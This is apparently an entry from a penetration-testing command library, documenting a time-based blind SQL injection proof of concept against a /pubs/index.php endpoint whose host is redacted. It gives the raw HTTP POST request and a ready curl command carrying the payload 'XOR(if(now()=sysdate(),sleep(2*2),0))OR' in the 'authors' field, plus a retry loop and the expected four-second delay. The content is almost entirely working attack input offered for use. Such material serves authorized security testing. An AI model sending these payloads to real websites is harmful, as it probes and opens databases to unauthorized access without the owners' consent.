---
id: cmd-uuid-poc-4sec
data: >-
  POST /pubs/index.php HTTP/1.1

  Host: ██████

  User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101
  Firefox/121.0

  Accept:
  text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate, br

  Content-Type: application/x-www-form-urlencoded

  Content-Length: 68

  Origin: https://███████

  Referer: https://███████/pubs/index.php

  Upgrade-Insecure-Requests: 1

  Sec-Fetch-Dest: document

  Sec-Fetch-Mode: navigate

  Sec-Fetch-Site: same-origin

  Sec-Fetch-User: ?1

  Te: trailers

  Connection: close


  years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
tags:
  - sqli
  - poc
  - time-based
type: command
output: HTTP response with ~4 second total time
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:05.233Z'
verified: false
validated: true
submitted: true
---
# poc-time-based-sqli-4sec-delay

## Command

```bash
POST /pubs/index.php HTTP/1.1
Host: ██████
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: https://███████
Referer: https://███████/pubs/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
Connection: close

years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'
```

## Description

This command sends a POST request with a time-based blind SQL injection payload in the 'authors' parameter to a vulnerable /pubs/index.php endpoint, triggering a 4-second sleep if successful. Use it to initially validate SQL injection in MySQL-based web apps.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| years | Year filter value (e.g., 2017) | Yes |
| authors | Injection payload string | Yes |
| Host | Target hostname (redacted) | Yes |
| User-Agent | Browser simulation | Yes |

## Examples

### Basic Usage

Use curl to replicate:
```bash
curl -X POST https://target/pubs/index.php -H "Content-Type: application/x-www-form-urlencoded" -d "years=2017&authors=Hurlburt'XOR(if(now()=sysdate(),sleep(2*2),0))OR'" -w "%{time_total}\n"
```

### Advanced Usage

Add timing measurement and retries:
```bash
for i in {1..3}; do curl ... -w "%{time_total}\n"; done
```

## Expected Output

HTTP 200 response with HTML content, but total execution time of ~4 seconds due to sleep(4).

## Related

- [[commands/poc-time-based-sqli-25sec-delay]]
- [[procedures/Exploit-Time-Based-Blind-SQL-Injection]]
